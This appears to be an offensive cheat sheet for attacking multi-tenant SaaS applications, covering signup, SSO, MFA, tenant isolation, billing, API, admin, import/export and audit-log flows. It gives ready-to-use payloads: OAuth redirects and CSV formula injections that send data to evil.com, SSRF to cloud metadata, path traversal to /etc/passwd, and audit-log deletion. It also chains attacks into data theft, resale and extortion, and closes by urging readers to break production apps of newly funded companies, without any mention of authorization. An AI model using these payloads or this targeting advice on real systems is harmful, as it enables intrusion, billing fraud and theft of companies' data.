# 🏢 **SAAS APPLICATION DEEP FLOW ANALYSIS & ATTACK MAP**
*For applications like: CRM, Project Management, HR Software, Marketing Tools*

---

## **1. SAAS ARCHITECTURE UNDERSTANDING**

### **Multi-Tenancy Model:**
```
[ ] Shared Database, Shared Schema (all data in same tables)
[ ] Shared Database, Separate Schema (each tenant gets own tables)
[ ] Separate Databases (each tenant has own DB)
[ ] Hybrid (some shared, some isolated)

VULNERABILITY: Tenant Isolation Bypass = CRITICAL
```

### **Key SAAS Characteristics:**
```
✅ Subscription-based pricing (monthly/yearly)
✅ Multi-tenant architecture
✅ Self-service onboarding
✅ Tiered feature access (Free/Basic/Pro/Enterprise)
✅ API-first design
✅ Team/collaboration features
✅ Admin/user role hierarchy
```

---

## **2. TENANT ONBOARDING & REGISTRATION FLOW**

### **FLOW: New Tenant/Organization Signup**
```
Step 1: Visit app.com → "Start Free Trial"
Step 2: Enter org details (name, industry, size)
Step 3: Create admin account (email, password)
Step 4: Choose plan (Free/Pro/Enterprise)
Step 5: Verify email → Set up workspace
Step 6: Invite team members
Step 7: Configure settings → Start using
```

**🔴 ATTACK POINTS:**
```http
# 1. Plan Downgrade/Upgrade Manipulation
POST /api/signup
{
  "plan": "enterprise",  # Try selecting enterprise for free
  "billing_cycle": "yearly",
  "discount": "100%",
  "seat_count": 999  # Unlimited users for free
}

# 2. Tenant/Org ID Enumeration
POST /api/check-org
{"org_name": "existing-company"} → "Already exists"
# Enumeration leads to targeted attacks

# 3. Workspace/Subdomain Hijacking
https://{tenant}.app.com
# Try: admin, support, api, staging, demo
# Try: existing-company names

# 4. Unlimited Free Trial
POST /api/extend-trial
{
  "trial_days": 365,
  "reason": "evaluation"
}
# Or: trial_end_date=2099-12-31

# 5. Admin Account Takeover During Setup
# Race condition: Two people sign up same org
# First to verify email becomes admin
```

### **FLOW: Team Member Invitation**
```
Step 1: Admin → Settings → Team → Invite
Step 2: Enter emails, assign roles
Step 3: Send invites
Step 4: User receives email → Accepts invite
Step 5: Joins workspace
```

**🔴 ATTACK POINTS:**
```http
# 1. Invite Abuse (User Enumeration)
POST /api/team/invite
{
  "emails": ["victim1@company.com", "victim2@company.com"],
  "role": "admin"  # Try inviting as admin
}

# 2. Invitation Link Tampering
https://app.com/accept-invite?token=ABC123&email=user@company.com
# Change email parameter to hijack invite

# 3. Role Elevation via Invite
# Accept invite as normal user
# Modify request to become admin
# Or resend invite to self with admin role

# 4. Invitation Flooding
# Send thousands of invites to victim email
# Causing email spam/DOS
```

---

## **3. USER AUTHENTICATION & SSO FLOW**

### **FLOW: SAAS Login with SSO (SAML/OAuth)**
```
Step 1: User clicks "Sign in with Google/Okta"
Step 2: Redirect to Identity Provider
Step 3: User authenticates at IdP
Step 4: IdP sends SAML assertion/OAuth token
Step 5: SAAS app validates → Creates session
Step 6: Redirect to app dashboard
```

**🔴 ATTACK POINTS:**
```http
# 1. SAML Signature Bypass
<saml:Assertion>
  <ds:Signature>...</ds:Signature>
</saml:Assertion>
# Remove signature or use "Signature: None"

# 2. SAML Recipient Manipulation
<saml:AudienceRestriction>
  <saml:Audience>https://victim.app.com</saml:Audience>
</saml:AudienceRestriction>
# Change to attacker's SAAS instance

# 3. OAuth Redirect URI Hijacking
GET /oauth/authorize?
  client_id=xxx&
  redirect_uri=https://evil.com/callback&
  response_type=code

# 4. OAuth State Parameter Bypass
# Missing state parameter = CSRF
# Predictable state = Session fixation

# 5. SSO Configuration Takeover
POST /admin/sso/settings
{
  "sso_url": "https://evil.com/saml",
  "certificate": "attacker_cert"
}
# Upload malicious SAML config
```

### **FLOW: Multi-Factor Authentication**
```
Step 1: User enters email/password
Step 2: System prompts for MFA
Step 3: User enters TOTP code/SMS code
Step 4: System verifies → Grants access
```

**🔴 ATTACK POINTS:**
```http
# 1. MFA Bypass via Backup Codes
POST /api/mfa/verify
{
  "code": "00000000",  # Default backup code
  "method": "backup"
}

# 2. MFA Disablement
POST /api/profile/disable-mfa
{
  "reason": "device_lost",
  "email": "victim@company.com"
}

# 3. TOTP Secret Leakage
GET /api/mfa/setup
Response: {"secret": "JBSWY3DPEHPK3PXP"}

# 4. SMS Code Brute Force
POST /api/mfa/verify-sms
{
  "code": "000000"
}
# Try 000000-999999, no rate limit

# 5. MFA Fatigue Attack
# Send continuous MFA prompts until user accepts
```

---

## **4. TENANT ISOLATION BYPASS (CRITICAL FOR SAAS)**

### **FLOW: Data Access Between Tenants**
```
Architecture: Single app instance serves multiple companies
Each company's data should be isolated
Access controlled by tenant_id in database queries
```

**🔴 ATTACK POINTS:**
```http
# 1. Missing Tenant ID in API Calls
GET /api/users
# Should be: /api/users?tenant_id=123
# If missing, returns all users across tenants

# 2. Tenant ID in JWT Token
{
  "user_id": 456,
  "tenant_id": 123  # Try changing to 124
}

# 3. Cross-Tenant IDOR
GET /api/documents/1001
# Document 1001 belongs to Tenant A
# User from Tenant B accesses it

# 4. Search Function Leakage
GET /api/search?q=confidential
# Returns results from all tenants

# 5. Export Data Leakage
POST /api/reports/export
{
  "format": "csv",
  "filters": {}
}
# Exports all tenant data, not just yours

# 6. Global Admin Views
GET /admin/all-users
GET /admin/all-companies
# Regular user accessing admin endpoints
```

### **FLOW: File Storage & Isolation**
```
Each tenant uploads files
Files stored in: /uploads/tenant_123/file.pdf
Should only be accessible by tenant 123
```

**🔴 ATTACK POINTS:**
```http
# 1. Path Traversal in File URLs
GET /uploads/tenant_123/../../tenant_124/secret.pdf

# 2. Predictable File Names
/files/{tenant_id}/{timestamp}.pdf
# Guess other tenant's timestamps

# 3. S3 Bucket Misconfiguration
https://company-app.s3.amazonaws.com/uploads/tenant_123/file.pdf
# Try tenant_124, tenant_125
# Check bucket policy: ListObjects allowed?

# 4. Signed URL Bypass
https://app.com/file/ABC123?expires=123456&signature=XYZ
# Reuse signature, modify parameters
```

---

## **5. TEAM COLLABORATION & PERMISSIONS FLOW**

### **FLOW: Role-Based Access Control**
```
Roles: Owner → Admin → Member → Guest → Viewer
Permissions cascade down
Granular permissions per resource
```

**🔴 ATTACK POINTS:**
```http
# 1. Role Elevation via API
POST /api/users/update-role
{
  "user_id": "attacker_id",
  "new_role": "admin",
  "current_role": "member"
}

# 2. Permission Inheritance Bypass
Resource: Project Alpha
Permissions: Admin (full), Member (edit), Viewer (read)
# As Viewer, try to edit/delete

# 3. Group/Team Permission Flaws
POST /api/teams/add-member
{
  "team_id": "executive-team",
  "user_id": "attacker",
  "permissions": "admin"
}
# Add yourself to admin teams

# 4. Resource Sharing Abuse
POST /api/resources/share
{
  "resource_id": "secret-doc",
  "share_with": ["external@evil.com"],
  "permission": "edit"
}
# Share confidential docs externally

# 5. Permission Enumeration
GET /api/permissions/check?resource=*&action=*
# List all possible permissions
```

### **FLOW: Real-time Collaboration**
```
Multiple users edit same document
Changes synced via WebSockets
Presence awareness (who's online)
```

**🔴 ATTACK POINTS:**
```http
# 1. WebSocket Authentication Bypass
wss://app.com/ws?token=ABC123
# Connect without token or with other user's token

# 2. Message Tampering in WebSocket
{
  "type": "edit",
  "document_id": "doc_123",
  "content": "<script>alert(1)</script>",
  "user_id": "victim_user"  # Impersonate other users
}

# 3. Presence Leakage
# See who's viewing which documents
# Monitor CEO viewing confidential files

# 4. Collaboration Race Conditions
User A: Starts editing
User B: Deletes document
User A: Saves changes → Where do they go?
```

---

## **6. BILLING & SUBSCRIPTION FLOW**

### **FLOW: Upgrade/Downgrade Plan**
```
Step 1: Admin → Billing → Change Plan
Step 2: Select new plan (Pro → Enterprise)
Step 3: Review price changes
Step 4: Confirm payment
Step 5: Features unlocked immediately
```

**🔴 ATTACK POINTS:**
```http
# 1. Plan Downgrade with Feature Retention
POST /api/billing/downgrade
{
  "new_plan": "free",
  "keep_features": true,
  "reason": "temporary"
}

# 2. Price Manipulation
POST /api/billing/upgrade
{
  "plan": "enterprise",
  "monthly_price": 1.00,  # Instead of $500
  "seats": 1000
}

# 3. Seat Limit Bypass
POST /api/billing/update-seats
{
  "seat_count": 9999,
  "price_per_seat": 0.01
}

# 4. Plan Feature Mixing
POST /api/billing/custom-plan
{
  "features": ["enterprise_feature1", "enterprise_feature2"],
  "price": "basic_plan_price"
}

# 5. Trial Reactivation
POST /api/billing/reactivate-trial
{
  "trial_days": 30,
  "reason": "evaluation"
}
# Call multiple times for unlimited trial
```

### **FLOW: Usage-Based Billing**
```
Charges based on:
- API calls per month
- Storage used
- Number of users
- Feature usage
```

**🔴 ATTACK POINTS:**
```http
# 1. Usage Counter Manipulation
POST /api/usage/report
{
  "user_id": "attacker",
  "api_calls": 0,  # Report 0 usage
  "storage_used": 0
}

# 2. Metering Bypass
# Features that should be metered but aren't
# Find unmetered API endpoints

# 3. Cross-Tenant Usage Attribution
# Make other tenants use your API keys
# Their usage gets billed to you? Or them?

# 4. Free Tier Abuse
# Create multiple accounts
# Distribute usage across them
```

### **FLOW: Invoice & Payment**
```
Step 1: Monthly invoice generated
Step 2: Admin views/downloads invoice
Step 3: Pays via credit card/bank transfer
Step 4: Payment recorded
```

**🔴 ATTACK POINTS:**
```http
# 1. Invoice Amount Manipulation
GET /api/invoices/123/pdf?amount=1.00
# Generate PDF with modified amount

# 2. Invoice Deletion
DELETE /api/invoices/123
# Delete unpaid invoices

# 3. Payment Marking
POST /api/payments/mark-paid
{
  "invoice_id": "123",
  "amount": 0.01,
  "method": "manual"
}

# 4. Credit/Discount Abuse
POST /api/billing/add-credit
{
  "amount": 10000,
  "reason": "referral_bonus",
  "expires": "never"
}
```

---

## **7. API & INTEGRATION FLOW**

### **FLOW: API Key Management**
```
Step 1: User creates API key
Step 2: Set permissions (read/write/all)
Step 3: Set rate limits
Step 4: Use key to access API
```

**🔴 ATTACK POINTS:**
```http
# 1. API Key Permission Elevation
POST /api/keys/create
{
  "name": "attacker-key",
  "permissions": ["*", "admin", "sudo"],
  "rate_limit": 999999
}

# 2. API Key Leakage in JS
View source → Find API keys in frontend code

# 3. API Key Reuse Across Tenants
# Key from Tenant A works for Tenant B

# 4. Missing Rate Limiting
# Unlimited API calls → Resource exhaustion

# 5. Webhook Secret Bypass
POST /webhooks/order-created
X-Signature: sha256=abc123
# Send without signature or with weak signature
```

### **FLOW: Third-Party Integrations**
```
Step 1: Install integration (Slack, Google Drive)
Step 2: Authorize access
Step 3: Configure settings
Step 4: Integration active
```

**🔴 ATTACK POINTS:**
```http
# 1. OAuth Scope Escalation
https://oauth.provider.com/authorize?
  client_id=xxx&
  scope=read+write+admin  # Add extra scopes

# 2. Integration Token Theft
GET /api/integrations/tokens
# List all integration access tokens

# 3. Malicious Integration Installation
# Upload malicious integration
# Runs with app permissions

# 4. SSRF via Integration Callbacks
POST /api/integrations/callback
{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

---

## **8. ADMIN & SUPER-ADMIN FLOW**

### **FLOW: Super Admin Access (SAAS Provider)**
```
Separate portal: admin.app.com
Can access all tenant data
Manage system-wide settings
```

**🔴 ATTACK POINTS:**
```http
# 1. Super Admin Portal Access
https://admin.app.com
https://dashboard.app.com/admin
https://app.com/internal
Default credentials: admin/admin

# 2. Tenant Impersonation
POST /admin/impersonate
{
  "tenant_id": "victim-company",
  "user_id": "ceo@victim.com"
}
# Login as any user in any company

# 3. Global Data Export
GET /admin/export/all-data?format=sql
# Dump entire database

# 4. System Configuration Tampering
POST /admin/config
{
  "billing_enabled": false,
  "trial_days": 9999,
  "require_approval": false
}

# 5. Tenant Termination/Deletion
DELETE /admin/tenants/victim-company
# Delete competitor's account
```

### **FLOW: Tenant Admin Management**
```
Within tenant: Settings → Admin
Manage team, billing, security
```

**🔴 ATTACK POINTS:**
```http
# 1. Admin Elevation via Invitation
# Regular user receives admin invite
# Modify invite acceptance to become super-admin

# 2. Security Settings Bypass
POST /admin/security/settings
{
  "require_2fa": false,
  "password_policy": "none",
  "session_timeout": 999999
}

# 3. Audit Log Tampering
DELETE /admin/audit-logs
POST /admin/audit-logs
{
  "action": "user_login",
  "user": "attacker",
  "timestamp": "old_date",
  "ip": "legitimate_ip"
}
# Insert fake logs
```

---

## **9. DATA IMPORT/EXPORT FLOW**

### **FLOW: Bulk Data Import**
```
Step 1: Download template CSV
Step 2: Fill with data
Step 3: Upload CSV
Step 4: System processes import
Step 5: Data appears in app
```

**🔴 ATTACK POINTS:**
```http
# 1. CSV Injection
"=HYPERLINK(""http://evil.com?leak=""&A1&A2, ""Click"")"
# When opened in Excel, leaks data

# 2. Formula Injection
"=cmd|' /C calc'!A0"
"=WEBSERVICE(""http://evil.com?leak=""&A1)"

# 3. Mass Assignment via Import
id,name,email,role,is_admin
"1","Attacker","evil@evil.com","CEO","true"

# 4. Import Race Condition
# Import same data multiple times
# Duplicate records, overflow database

# 5. Malicious File Upload via Import
# Upload PHP file disguised as CSV
```

### **FLOW: Data Export & Reports**
```
Step 1: Apply filters
Step 2: Select fields
Step 3: Choose format (PDF/CSV/Excel)
Step 4: Generate export
Step 5: Download file
```

**🔴 ATTACK POINTS:**
```http
# 1. Export All Data
POST /api/reports/export
{
  "filters": {},
  "fields": ["*"],
  "format": "csv"
}
# Empty filters = all data

# 2. Field Enumeration via Export
"fields": ["password_hash", "api_keys", "tokens"]

# 3. Export Scheduling Abuse
POST /api/exports/schedule
{
  "frequency": "daily",
  "email": "attacker@evil.com",
  "filters": {}  # All data
}
# Get daily data dumps

# 4. Export Format Injection
"format": "../etc/passwd"
"format": "php://filter/convert.base64-encode/resource=index.php"
```

---

## **10. AUDIT & COMPLIANCE FLOW**

### **FLOW: Audit Logging**
```
All actions logged
Logs stored for compliance
Admins can view logs
```

**🔴 ATTACK POINTS:**
```http
# 1. Log Injection
POST /api/users/create
{
  "name": "Attacker\n[SUCCESS] Admin password changed",
  "email": "evil@evil.com"
}
# Fake success messages in logs

# 2. Log Deletion
DELETE /api/audit-logs?before=2024-01-01
# Delete evidence

# 3. Log Tampering via API
PUT /api/audit-logs/12345
{
  "action": "user_login",
  "user": "legitimate_user",
  "ip": "1.2.3.4"
}
# Modify existing logs

# 4. Log Enumeration
GET /api/audit-logs?user=ceo@company.com
# Monitor CEO activities
```

### **FLOW: Compliance Exports (GDPR, CCPA)**
```
Step 1: User requests data export
Step 2: System compiles all user data
Step 3: Generates ZIP file
Step 4: User downloads
```

**🔴 ATTACK POINTS:**
```http
# 1. Data Subject Access Request Abuse
POST /api/gdpr/export
{
  "email": "victim@company.com",
  "reason": "personal_data_request"
}
# Get all data of any user

# 2. Data Deletion Request Abuse
POST /api/gdpr/delete
{
  "email": "ceo@competitor.com",
  "reason": "right_to_be_forgotten"
}
# Delete competitor's account

# 3. Export Link Predictability
https://app.com/gdpr/export/ABC123.zip
# Brute force other users' export links

# 4. Incomplete Data Deletion
# Deleted users' data remains in backups
# Access via backup restoration
```

---

## **11. BUSINESS LOGIC ATTACKS (SAAS SPECIFIC)**

### **Attack 1: Tenant Resource Exhaustion**
```
1. Sign up for free tier
2. Upload massive files (fill storage)
3. Make millions of API calls
4. Create thousands of users
5. Crash the system for that tenant
```

### **Attack 2: Cross-Tenant Data Poisoning**
```
1. Tenant A: Create malicious data (XSS payloads)
2. Data gets into shared caches/search indexes
3. Tenant B: Views data → XSS executes in their context
```

### **Attack 3: Plan Downgrade Timing Attack**
```
1. Upgrade to Enterprise ($500/month)
2. Use all premium features
3. On last day of billing cycle, downgrade to Free
4. Only pay for one day at Enterprise rate
5. Repeat monthly
```

### **Attack 4: Team Member Account Takeover**
```
1. Company uses SAAS app
2. Attacker gets low-privilege account (intern@company.com)
3. Finds IDOR to become admin
4. Exports all company data
5. Sells to competitors
```

### **Attack 5: SAAS Marketplace Attack**
```
1. Create malicious "integration"
2. List on SAAS marketplace
3. Companies install it
4. Integration steals all their data
5. Send to attacker's server
```

---

## **12. ADVANCED CHAINING ATTACKS**

### **Full SAAS Compromise Chain:**
```
1. Find IDOR in user profile → Access admin user's profile
2. Steal admin's API key from profile
3. Use API key to list all tenants
4. Find high-value target (bank, tech company)
5. Use admin API to impersonate their admin
6. Export all their data
7. Delete audit logs
8. Set up backdoor webhook for ongoing access
```

### **Multi-Tenant Data Breach:**
```
1. Find search endpoint without tenant isolation
2. Search for "password", "secret", "confidential"
3. Get results from all tenants
4. Filter for high-value data (SSN, credit cards)
5. Mass download via export feature
```

### **Business Destruction Attack:**
```
1. Sign up as legitimate company
2. Upload all data (migrate to SAAS)
3. Become dependent on platform
4. Attacker: Find vulnerability to delete tenant
5. Delete company's data
6. Company goes out of business
7. Extort for restoration (ransomware-style)
```

---

## **🎯 SAAS TESTING PRIORITY MATRIX**

### **CRITICAL (Test First):**
```
1. Tenant Isolation Bypass
2. Super Admin Access
3. Billing/Payment Bypass
4. Mass Data Export
5. Authentication/SSO Bypass
```

### **HIGH (Test Next):**
```
1. Role/Permission Escalation
2. API Key Security
3. File Access Between Tenants
4. Integration Security
5. Audit Log Tampering
```

### **MEDIUM:**
```
1. Rate Limit Bypass
2. Feature Access Without Payment
3. User Enumeration
4. Information Disclosure
```

### **LOW:**
```
1. UI/UX Issues
2. Missing Security Headers
3. Error Message Details
```

---

## **🔧 SAAS-SPECIFIC TESTING TOOLS**

### **For Tenant Isolation Testing:**
```bash
# Modify tenant_id in all requests
Burp Suite: "Match and Replace"
- Replace "tenant_id=123" with "tenant_id=124"

# Test subdomain takeover
subjack -c wordlist.txt -t targets.txt

# Test S3 bucket permissions
aws s3 ls s3://company-uploads --no-sign-request
```

### **For API Testing:**
```bash
# Test rate limits
wrk -t12 -c400 -d30s https://api.app.com/v1/users

# Test JWT tampering
jwt_tool <JWT_TOKEN> -T

# Test GraphQL endpoints
graphqlmap -u https://api.app.com/graphql
```

---

## **📝 DOCUMENTATION TEMPLATE FOR SAAS**

```markdown
# SAAS Application: [App Name]
# URL: [https://app.com]
# Date Tested: [DD/MM/YYYY]

## Tenant Model Analysis:
- [ ] Shared Database
- [ ] Separate Databases
- [ ] Subdomain per tenant: tenant.app.com
- [ ] Path-based: app.com/tenant/

## Authentication Flows:
- [ ] Email/Password
- [ ] SSO (SAML/OAuth)
- [ ] MFA (TOTP/SMS)
- [ ] API Key Authentication

## Billing Model:
- [ ] Per User/Month
- [ ] Usage-Based
- [ ] Feature-Based Tiers
- [ ] Annual/Monthly

## Critical Flows Identified:
1. Tenant Onboarding
2. Team Invitation
3. Plan Upgrade/Downgrade
4. Data Export/Import
5. Integration Setup

## Attack Surface Map:
[Diagram showing all flows and attack points]

## Found Vulnerabilities:
[Detailed list with PoC]
```

---

**Remember:** SAAS applications are complex beasts. The key is understanding the **multi-tenancy model** and **subscription billing**. 

**Your mantra:** "Can I access another company's data? Can I get paid features for free?"

**Start with:** Tenant isolation testing → Billing bypass → Admin access

**Pro tip:** Many SAAS apps have a "demo" or "sandbox" environment with weaker security. Test there first, then move to production.

**Now go break some SAAS applications! 🚀**

---

*Bonus: Look for SAAS companies that recently raised funding. They're often scaling fast and security might be lagging.*
